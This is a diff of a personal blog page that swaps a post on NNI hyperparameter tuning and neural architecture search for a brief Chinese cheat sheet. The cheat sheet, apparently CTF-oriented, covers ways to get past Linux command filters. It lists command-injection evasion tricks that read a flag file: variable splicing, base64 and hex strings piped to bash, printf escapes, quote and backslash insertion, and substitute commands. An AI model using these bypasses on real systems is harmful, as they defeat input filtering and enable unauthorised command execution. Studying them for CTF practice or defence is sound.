@@ -22,20 +22,19 @@
     var CONFIG = {"hostname":"garen-wang.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="未完成任务Task 2.2-[] HPO-[] 在搜索空间中选择随机结构，并验证性能-[] NAS Task 3.1-[] 跑通NNI Feature Engineering Sample Task 3.2Task 3.2.1Task 3.2.2Task 4HPO超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。 Assessor在数据量较大的">
+  <meta name="description" content="几个常用方法定义变量然后拼接绕过12lsa&#x3D;l;b&#x3D;s;$a$b 编码绕过12echo &quot;Y2F0IC9mbGFn&quot; | base64 -d | bash # &#x3D;&gt;cat &#x2F;flag in base64echo &quot;636174202f666c6167&quot; | xxd -r -p | bash # &#x3D;&gt;cat &#x2F;flag in hex 上述适用于ec">
 <meta property="og:type" content="article">
-<meta property="og:title" content="NNI Exploration Learning Notes">
-<meta property="og:url" content="http://garen-wang.cn/2021/01/23/NNI-Exploration-Learning-Notes/index.html">
+<meta property="og:title" content="Linux用不常用的命令绕过常用命令过滤">
+<meta property="og:url" content="http://garen-wang.cn/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/index.html">
 <meta property="og:site_name" content="Garen Wang&#39;s Blog">
-<meta property="og:description" content="未完成任务Task 2.2-[] HPO-[] 在搜索空间中选择随机结构，并验证性能-[] NAS Task 3.1-[] 跑通NNI Feature Engineering Sample Task 3.2Task 3.2.1Task 3.2.2Task 4HPO超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。 Assessor在数据量较大的">
+<meta property="og:description" content="几个常用方法定义变量然后拼接绕过12lsa&#x3D;l;b&#x3D;s;$a$b 编码绕过12echo &quot;Y2F0IC9mbGFn&quot; | base64 -d | bash # &#x3D;&gt;cat &#x2F;flag in base64echo &quot;636174202f666c6167&quot; | xxd -r -p | bash # &#x3D;&gt;cat &#x2F;flag in hex 上述适用于ec">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-01-23T15:19:35.000Z">
-<meta property="article:modified_time" content="2021-03-18T13:26:59.899Z">
+<meta property="article:published_time" content="2021-10-04T09:34:20.000Z">
+<meta property="article:modified_time" content="2021-10-04T10:17:59.390Z">
 <meta property="article:author" content="Garen Wang">
-<meta property="article:tag" content="NNI">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://garen-wang.cn/2021/01/23/NNI-Exploration-Learning-Notes/">
+<link rel="canonical" href="http://garen-wang.cn/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/">
 
 
 <script id="page-configurations">
@@ -48,7 +47,7 @@
   };
 </script>
 
-  <title>NNI Exploration Learning Notes | Garen Wang's Blog</title>
+  <title>Linux用不常用的命令绕过常用命令过滤 | Garen Wang's Blog</title>
   
 
 
@@ -188,7 +187,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/01/23/NNI-Exploration-Learning-Notes/">
+    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -201,7 +200,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          NNI Exploration Learning Notes
+          Linux用不常用的命令绕过常用命令过滤
         </h1>
 
         <div class="post-meta">
@@ -210,19 +209,13 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2021-01-23 23:19:35" itemprop="dateCreated datePublished" datetime="2021-01-23T23:19:35+08:00">2021-01-23</time>
+              <time title="Created: 2021-10-04 17:34:20 / Modified: 18:17:59" itemprop="dateCreated datePublished" datetime="2021-10-04T17:34:20+08:00">2021-10-04</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
-              </span>
 
           
-            <span id="/2021/01/23/NNI-Exploration-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Exploration Learning Notes" title="Views">
+            <span id="/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/" class="post-meta-item leancloud_visitors" data-flag-title="Linux用不常用的命令绕过常用命令过滤" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -237,8 +230,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2021/01/23/NNI-Exploration-Learning-Notes/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/23/NNI-Exploration-Learning-Notes/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -253,17 +246,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="未完成任务"><a href="#未完成任务" class="headerlink" title="未完成任务"></a>未完成任务</h2><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h3><p>-[] HPO<br>-[] 在搜索空间中选择随机结构，并验证性能<br>-[] NAS</p>
-<h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3.1"></a>Task 3.1</h3><p>-[] 跑通NNI Feature Engineering Sample</p>
-<h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3.2"></a>Task 3.2</h3><h4 id="Task-3-2-1"><a href="#Task-3-2-1" class="headerlink" title="Task 3.2.1"></a>Task 3.2.1</h4><h4 id="Task-3-2-2"><a href="#Task-3-2-2" class="headerlink" title="Task 3.2.2"></a>Task 3.2.2</h4><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><h2 id="HPO"><a href="#HPO" class="headerlink" title="HPO"></a>HPO</h2><p>超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。</p>
-<h3 id="Assessor"><a href="#Assessor" class="headerlink" title="Assessor"></a>Assessor</h3><p>在数据量较大的情况下，一般一个trial普遍会比较久，NNI支持Assessor，实现在调优过程中类似“剪枝”的功能，提供了提前终止某些trial的策略以节省实验时间。</p>
-<p>需要添加assessor时只需在<code>config.yml</code>中添加，这里以Curvefitting为例：</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">assessor:</span></span><br><span class="line">  <span class="attr">builtinAssessorName:</span> <span class="string">Curvefitting</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">epoch_num:</span> <span class="number">10</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">0.9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h2><h3 id="搜索空间的编写"><a href="#搜索空间的编写" class="headerlink" title="搜索空间的编写"></a>搜索空间的编写</h3><p>在做NAS的过程中，我们需要手动写出待搜索的模型的类，我们借助NNI中的mutables来实现模型搜索空间的构建。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">1</span>, key=<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.mid_conv(x)</span><br><span class="line">        skip_x = self.input_switch([x])</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> skip_x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            x = x + skip_x</span><br><span class="line">        x = self.pool(F.relu(x))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
-<p><code>mutables.LayerChoice</code>实现了神经网络模型中一层的多选一，待选的神经网络层只需要在里面列出来即可。例如上面的代码，就实现了3*3和5*5两种二维卷积层的选择空间。</p>
-<p><code>mutables.InputChoice</code>实现了可跳过连接。在上述代码中，表示了mid_conv层是可跳过层。可跳过层的前后代码保持不变，在可跳过层则需要从可能连接加入到后一层的输出中。</p>
-<h3 id="Classical-NAS"><a href="#Classical-NAS" class="headerlink" title="Classical NAS"></a>Classical NAS</h3><h3 id="One-shot-NAS"><a href="#One-shot-NAS" class="headerlink" title="One-shot NAS"></a>One-shot NAS</h3><h3 id="DARTS"><a href="#DARTS" class="headerlink" title="DARTS"></a>DARTS</h3><h3 id="ENAS"><a href="#ENAS" class="headerlink" title="ENAS"></a>ENAS</h3>
+        <h2 id="几个常用方法"><a href="#几个常用方法" class="headerlink" title="几个常用方法"></a>几个常用方法</h2><h3 id="定义变量然后拼接绕过"><a href="#定义变量然后拼接绕过" class="headerlink" title="定义变量然后拼接绕过"></a>定义变量然后拼接绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | base64 -d | bash <span class="comment"># =&gt;cat /flag in base64</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p | bash <span class="comment"># =&gt;cat /flag in hex</span></span><br></pre></td></tr></table></figure>
+<p>上述适用于echo没被过滤的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) <span class="comment"># =&gt;cat /flag</span></span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\<span class="variable">$0</span> <span class="comment"># =&gt;cat /flag</span></span><br></pre></td></tr></table></figure>
+<p>适用于printf没被过滤的情况</p>
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t fl<span class="string">&#x27;&#x27;</span>ag</span><br><span class="line">ca<span class="string">&quot;&quot;</span>t fl<span class="string">&quot;&quot;</span>ag</span><br></pre></td></tr></table></figure>
+<h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+<h2 id="可供替换的冷门命令"><a href="#可供替换的冷门命令" class="headerlink" title="可供替换的冷门命令"></a>可供替换的冷门命令</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>dir</p>
+<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>tac, sort, more, less, head, tail, (sed)</p>
+
     </div>
 
     
@@ -271,10 +263,6 @@
     
 
       <footer class="post-footer">
-          
-          <div class="post-tags">
-              <a href="/tags/NNI/" rel="tag"><i class="fa fa-tag"></i> NNI</a>
-          </div>
 
         
 
@@ -282,12 +270,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/01/22/Writeup-for-Second-Week/" rel="prev" title="Writeup for Second Week">
-      <i class="fa fa-chevron-left"></i> Writeup for Second Week
+    <a href="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" rel="prev" title="SQL注入题型总结">
+      <i class="fa fa-chevron-left"></i> SQL注入题型总结
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/01/25/Convolution-Neural-Network-Learning-Notes/" rel="next" title="Convolution Neural Network Learning Notes">
-      Convolution Neural Network Learning Notes <i class="fa fa-chevron-right"></i>
+    <a href="/2021/10/04/flask-SSTI%E5%AD%A6%E4%B9%A0/" rel="next" title="flask SSTI学习">
+      flask SSTI学习 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -348,7 +336,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E5%AE%8C%E6%88%90%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.</span> <span class="nav-text">未完成任务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-2-2"><span class="nav-number">1.1.</span> <span class="nav-text">Task 2.2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-3-1"><span class="nav-number">1.2.</span> <span class="nav-text">Task 3.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-3-2"><span class="nav-number">1.3.</span> <span class="nav-text">Task 3.2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-3-2-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">Task 3.2.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-3-2-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Task 3.2.2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-4"><span class="nav-number">1.4.</span> <span class="nav-text">Task 4</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HPO"><span class="nav-number">2.</span> <span class="nav-text">HPO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Assessor"><span class="nav-number">2.1.</span> <span class="nav-text">Assessor</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NAS"><span class="nav-number">3.</span> <span class="nav-text">NAS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E7%A9%BA%E9%97%B4%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-number">3.1.</span> <span class="nav-text">搜索空间的编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Classical-NAS"><span class="nav-number">3.2.</span> <span class="nav-text">Classical NAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#One-shot-NAS"><span class="nav-number">3.3.</span> <span class="nav-text">One-shot NAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DARTS"><span class="nav-number">3.4.</span> <span class="nav-text">DARTS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ENAS"><span class="nav-number">3.5.</span> <span class="nav-text">ENAS</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">几个常用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F%E7%84%B6%E5%90%8E%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text">定义变量然后拼接绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text">引号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text">反斜杠绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E4%BE%9B%E6%9B%BF%E6%8D%A2%E7%9A%84%E5%86%B7%E9%97%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">可供替换的冷门命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ls"><span class="nav-number">2.1.</span> <span class="nav-text">ls</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cat"><span class="nav-number">2.2.</span> <span class="nav-text">cat</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
